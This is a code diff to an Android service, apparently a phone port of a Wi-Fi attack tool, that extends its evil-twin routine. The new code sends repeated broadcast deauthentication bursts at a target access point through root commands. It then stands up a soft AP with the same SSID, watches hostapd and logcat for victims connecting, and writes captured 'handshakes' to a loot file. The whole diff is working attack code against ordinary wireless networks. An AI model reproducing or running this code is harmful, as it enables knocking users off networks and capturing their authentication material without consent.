@@ -196,68 +196,93 @@ public class PwngService extends Service {
     }
 
     private boolean doEvilTwin(String bssid, String ssid, int freq, boolean deauth) {
-        try {
-            // ── Phase 1: Hard deauth burst BEFORE WiFi toggle ──
-            // Must run while wlan0 is still in STA/managed mode so nl80211 works
-            if (deauth) {
-                brain.currentStatus = "👊 deauth " + ssid + " (8s burst)";
+        // ── Multi-pass Evil Twin: hammer the client with deauth, then offer our AP ──
+        // Phone AP signal is weak vs router, so we need multiple rounds to wear down client
+        final int PASSES = deauth ? 3 : 1;  // 3 passes with deauth, 1 without
+        final int DEAUTH_SEC = 12;           // deauth burst duration per pass
+        final int AP_WINDOW_SEC = 40;        // how long we keep Evil Twin up per pass
+        
+        boolean caught = false;
+        int pass;
+        
+        for (pass = 1; pass <= PASSES && !caught && isRunning; pass++) {
+            try {
+                // ── Phase 1: Continuous deauth (STA mode, nl80211 works) ──
+                if (deauth) {
+                    brain.currentStatus = "👊 deauth " + ssid + " (pass " + pass + "/" + PASSES + ")";
+                    updateNotification();
+                    long deauthEnd = System.currentTimeMillis() + DEAUTH_SEC * 1000L;
+                    while (System.currentTimeMillis() < deauthEnd && isRunning) {
+                        execSu("/data/data/com.pwnagotchi.app/deauth " + IFACE + " " + bssid
+                               + " ff:ff:ff:ff:ff:ff " + freq);
+                        sleep(400);  // ~2.5/sec, ~30 packets per pass
+                    }
+                }
+                
+                // ── Phase 2: Switch to AP mode on target channel ──
+                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
+                    + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
+                    + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " disable_network \\$nid 2>/dev/null; done");
+                
+                brain.currentStatus = "🎭 Evil Twin: " + ssid + " (ch " + freq + " pass " + pass + "/" + PASSES + ")";
                 updateNotification();
-                long deauthEnd = System.currentTimeMillis() + 8000;
-                while (System.currentTimeMillis() < deauthEnd && isRunning) {
-                    execSu("/data/data/com.pwnagotchi.app/deauth " + IFACE + " " + bssid
-                           + " ff:ff:ff:ff:ff:ff " + freq);
-                    sleep(400);  // ~2.5 packets/sec, ~20 deauth frames total
+                
+                execSu("cmd wifi set-wifi-enabled disabled"); sleep(1500);
+                execSu("cmd wifi start-softap \"" + ssid.replace("\"","\\\"") + "\" wpa2 twinpass12345 -f " + freq);
+                sleep(2000);
+                
+                // ── Phase 3: Wait for client handshake ──
+                long start = System.currentTimeMillis();
+                while (System.currentTimeMillis() - start < AP_WINDOW_SEC * 1000L && !caught && isRunning) {
+                    // Check hostapd for connected clients (more reliable than logcat grep)
+                    String clients = execSu("hostapd_cli -p /data/vendor/wifi/hostapd/sockets -i " + IFACE
+                        + " list_sta 2>/dev/null | grep -c '^..:..:..:..:..:..' 2>/dev/null").trim();
+                    if (!clients.isEmpty() && !clients.equals("0")) {
+                        caught = true;
+                        try {
+                            FileWriter fw = new FileWriter(new File(lootDir, "evil_twin_handshakes.txt"), true);
+                            fw.write("[" + new java.text.SimpleDateFormat("HH:mm:ss").format(new Date())
+                                + "] " + ssid + " (" + bssid + ") HANDSHAKE (pass " + pass + ")\n");
+                            fw.close();
+                        } catch (Exception e) {}
+                        break;
+                    }
+                    // Fallback: check logcat for EAPOL handshake evidence
+                    String log = execSu("logcat -d -s hostapd:* 2>&1 | grep -E 'EAPOL|AP-STA-CONNECTED' | tail -3");
+                    if (log.contains("AP-STA-CONNECTED") || log.contains("EAPOL")) {
+                        caught = true;
+                        try {
+                            FileWriter fw = new FileWriter(new File(lootDir, "evil_twin_handshakes.txt"), true);
+                            fw.write("[" + new java.text.SimpleDateFormat("HH:mm:ss").format(new Date())
+                                + "] " + ssid + " (" + bssid + ") HANDSHAKE EAPOL\n");
+                            fw.close();
+                        } catch (Exception e) {}
+                        break;
+                    }
+                    sleep(3000);
                 }
+                
+            } finally {
+                execSu("cmd wifi stop-softap");
+                sleep(800);
+                execSu("cmd wifi set-wifi-enabled enabled");
+                sleep(1500);
+                // Re-enable all networks
+                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
+                    + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
+                    + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " enable_network \\$nid 2>/dev/null; done");
+                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " reassociate");
             }
-            
-            // ── Phase 2: Switch to AP mode on SAME channel ──
-            // Disable all saved networks so phone doesn't auto-reconnect to home WiFi
-            execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
-                + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
-                + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " disable_network \\$nid 2>/dev/null; done");
-            
-            brain.currentStatus = "🎭 Evil Twin: " + ssid + " (ch " + freq + ")";
-            updateNotification();
-            
-            execSu("cmd wifi set-wifi-enabled disabled"); sleep(1500);
-            execSu("cmd wifi start-softap \"" + ssid.replace("\"","\\\"") + "\" wpa2 twinpass12345 -f " + freq);
-            sleep(2000);
-            
-            // ── Phase 3: Wait for handshake ──
-            // Client was deauth'd on this channel → scans → finds our AP immediately
-            boolean caught = false;
-            long start = System.currentTimeMillis();
-            while (System.currentTimeMillis() - start < 30000) {   // 30s window
-                String log = execSu("logcat -d -s hostapd:* 2>&1 | grep -E 'EAPOL|AP-STA-CONNECTED' | tail -3");
-                if (log.contains("AP-STA-CONNECTED") || log.contains("EAPOL")) {
-                    caught = true;
-                    try {
-                        FileWriter fw = new FileWriter(new File(lootDir, "evil_twin_handshakes.txt"), true);
-                        fw.write("[" + new java.text.SimpleDateFormat("HH:mm:ss").format(new Date())
-                            + "] " + ssid + " (" + bssid + ") HANDSHAKE\n");
-                        fw.close();
-                    } catch (Exception e) {}
-                    break;
-                }
-                sleep(3000);
-            }
-            
-            if (caught) { brain.currentFace = FACES.get("FRIEND"); brain.currentStatus = "🎭 CAUGHT: " + ssid; }
-            else brain.currentStatus = "🎭 no client for " + ssid;
-            return caught;
-            
-        } finally {
-            execSu("cmd wifi stop-softap");
-            sleep(1000);
-            execSu("cmd wifi set-wifi-enabled enabled");
-            sleep(2000);
-            // Re-enable all networks
-            execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
-                + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
-                + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " enable_network \\$nid 2>/dev/null; done");
-            execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " reassociate");
-            updateNotification();
         }
+        
+        if (caught) {
+            brain.currentFace = FACES.get("FRIEND");
+            brain.currentStatus = "🎭 CAUGHT: " + ssid + " (pass " + pass + ")";
+        } else {
+            brain.currentStatus = "🎭 no client for " + ssid + " (" + (pass-1) + " passes)";
+        }
+        updateNotification();
+        return caught;
     }
 
     // ─── PMKID ─────────────────────────────────────────────
